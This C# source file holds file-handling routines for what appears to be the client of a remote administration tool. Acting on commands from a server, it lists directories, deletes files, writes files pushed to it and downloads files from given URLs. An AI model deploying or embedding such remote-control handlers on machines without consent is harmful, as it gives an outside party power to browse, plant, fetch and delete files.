using Pace.Client.System;
using Pace.Client.Web;
using Pace.Common.Network;
using Pace.Common.Network.Packets;
using Pace.Common.Network.Packets.Client;
using Pace.Common.Network.Packets.Server;
using System;
using System.IO;
using System.Linq;

namespace Pace.Client.Handlers
{
    public static class FileHandlers
    {
        public static void HandleGetDirectory(PaceClient client, IPacket packet)
        {
            var getDirectoryPacket = (GetDirectoryRequestPacket)packet;

            var path = getDirectoryPacket.Path == string.Empty ? Environment.GetFolderPath(Environment.SpecialFolder.Windows) : getDirectoryPacket.Path;

            var directory = new DirectoryInfo(path);

            if (!directory.Exists)
                return;

            var folders = FileExplorer.GetDirectories(path);
            var files = FileExplorer.GetFiles(path);

            var response = new GetDirectoryResponsePacket
            {
                Name = directory.Name,
                Path = path,
                Folders = folders.Select(folder => folder.Name).ToArray(),
                Files = files.Select(file => file.Name).ToArray(),
                FileSizes = files.Select(file => file.Size).ToArray()
            };

            client.SendPacket(response);
        }

        public static void HandleDeleteFile(PaceClient client, IPacket packet)
        {
            var deleteFilePacket = (DeleteFileRequestPacket)packet;

            if (Directory.Exists(deleteFilePacket.File))
            {
                Directory.Delete(deleteFilePacket.File);
            }
            else if (File.Exists(deleteFilePacket.File))
            {
                File.Delete(deleteFilePacket.File);
            }

            var folders = FileExplorer.GetDirectories(Directory.GetParent(deleteFilePacket.File).FullName);
            var files = FileExplorer.GetFiles(Directory.GetParent(deleteFilePacket.File).FullName);

            client.SendPacket(new GetDirectoryResponsePacket
            {
                Folders = folders.Select(folder => folder.Name).ToArray(),
                Files = files.Select(file => file.Name).ToArray(),
                FileSizes = files.Select(file => file.Size).ToArray()
            });
        }

        public static void HandleSendFile(PaceClient client, IPacket packet)
        {
            var sendFilePacket = (SendFileRequestPacket)packet;
            File.WriteAllBytes(Path.Combine(Environment.CurrentDirectory, sendFilePacket.Filename), sendFilePacket.FileData);
        }

        public static void HandleDownloadFile(PaceClient client, IPacket packet)
        {
            var downloadFilePacket = (DownloadFileRequestPacket)packet;
            new WebFileDownloader().DownloadFile(downloadFilePacket.Url);
        }
    }
}